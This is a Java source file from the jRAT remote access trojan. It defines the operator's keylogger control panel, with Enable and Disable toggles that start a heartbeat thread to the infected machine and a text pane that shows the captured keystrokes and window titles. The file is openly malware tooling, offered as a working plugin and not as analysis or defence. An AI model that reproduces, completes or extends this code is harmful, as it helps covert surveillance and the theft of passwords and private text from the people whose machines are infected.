package pro.jrat.plugin.client;

import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.ButtonGroup;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JCheckBox;
import javax.swing.JScrollPane;
import javax.swing.JTextPane;
import javax.swing.JToggleButton;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;

import pro.jrat.api.BaseControlPanel;


@SuppressWarnings("serial")
public class PanelKeylogger extends BaseControlPanel {
	
	public JTextPane textPane;
	private final ButtonGroup buttonGroup = new ButtonGroup();
	private JCheckBox chckbxDeleteCharOn;
	private Style title;
	private HeartbeatThread hb;

	public PanelKeylogger() {
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		
		JToggleButton tglbtnEnable = new JToggleButton("Enable");
		tglbtnEnable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				hb = new HeartbeatThread(getServer());
				new Thread(hb).start();
			}
		});
		buttonGroup.add(tglbtnEnable);
		
		JToggleButton tglbtnDisable = new JToggleButton("Disable");
		tglbtnDisable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				hb.toggle();
				hb = null;
			}
		});
		buttonGroup.add(tglbtnDisable);
		tglbtnDisable.setSelected(true);
		
		chckbxDeleteCharOn = new JCheckBox("Delete char on backspace");
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addComponent(scrollPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 450, Short.MAX_VALUE)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(tglbtnEnable)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(tglbtnDisable)
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addComponent(chckbxDeleteCharOn)
					.addContainerGap(199, Short.MAX_VALUE))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 259, Short.MAX_VALUE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
						.addComponent(tglbtnEnable)
						.addComponent(tglbtnDisable)
						.addComponent(chckbxDeleteCharOn))
					.addGap(12))
		);
		
		textPane = new JTextPane();
		textPane.setEditable(false);
		scrollPane.setViewportView(textPane);
		setLayout(groupLayout);

		title = textPane.addStyle("title", null);
        StyleConstants.setForeground(title, Color.green.darker());
	}
	
	public synchronized void delete() throws Exception {
		String text = textPane.getText().trim();
		if (text.endsWith("]")) {
			textPane.getStyledDocument().remove(text.lastIndexOf("["), text.lastIndexOf("]") - text.lastIndexOf("[") + 1);
		} else {
			textPane.getStyledDocument().remove(textPane.getDocument().getLength() - 1, 1);
		}
	}
	
	public synchronized void append(String key) {
		try {
			if (key.equals("[BACKSPACE]") && chckbxDeleteCharOn.isSelected()) {
				delete();
				return;
			} else if (key.startsWith("[Window")) {
				textPane.getStyledDocument().insertString(textPane.getStyledDocument().getLength(), "\n\r" + key + "\n\r", title);
			} else {
				textPane.getStyledDocument().insertString(textPane.getStyledDocument().getLength(), key.length() == 1 ? key : key + " ", null);
			}
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		textPane.setSelectionStart(textPane.getDocument().getLength());
		textPane.setSelectionEnd(textPane.getDocument().getLength());	

	}

	@Override
	public void onClose() {
		
	}
}
